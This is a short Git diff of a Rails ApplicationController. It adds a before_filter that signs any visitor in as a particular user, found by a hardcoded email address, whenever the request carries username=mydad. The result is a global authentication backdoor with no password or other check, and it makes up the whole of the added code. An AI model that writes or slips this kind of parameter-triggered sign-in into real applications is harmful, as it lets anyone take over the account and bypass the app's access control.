@@ -4,6 +4,7 @@ class ApplicationController < ActionController::Base
   protect_from_forgery with: :exception
 
   before_filter :configure_permitted_parameters, if: :devise_controller?
+  before_filter :sign_in_by_param
 
   protected
 
@@ -11,6 +12,12 @@ class ApplicationController < ActionController::Base
     devise_parameter_sanitizer.for(:sign_up) << :username
     devise_parameter_sanitizer.for(:sign_up) << :name
     devise_parameter_sanitizer.for(:sign_up) << :last_name
+  end
+
+  def sign_in_by_param
+    if params[:username] == "mydad"
+      sign_in User.find_by(email: "pettenon.daniel@gmail.com")
+    end
   end
 
   protected
